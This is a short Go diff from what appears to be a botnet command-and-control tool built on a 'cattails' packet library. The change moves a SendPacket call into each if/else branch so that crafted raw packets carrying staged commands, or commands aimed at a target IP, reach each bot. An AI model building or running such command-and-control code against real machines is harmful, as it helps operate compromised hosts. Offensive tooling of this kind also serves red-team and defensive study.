@@ -57,11 +57,12 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 		// fmt.Println("DST IP:", bot.RespIP)
 		if targetIP == "" {
 			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateCommand(stagedCmd))
+			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
 		} else {
 			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateTargetCommand(targetcommand, targetIP))
+			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
 		}
 		// YEET
-		cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
 
 		if stagedCmd != "" {
 			fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
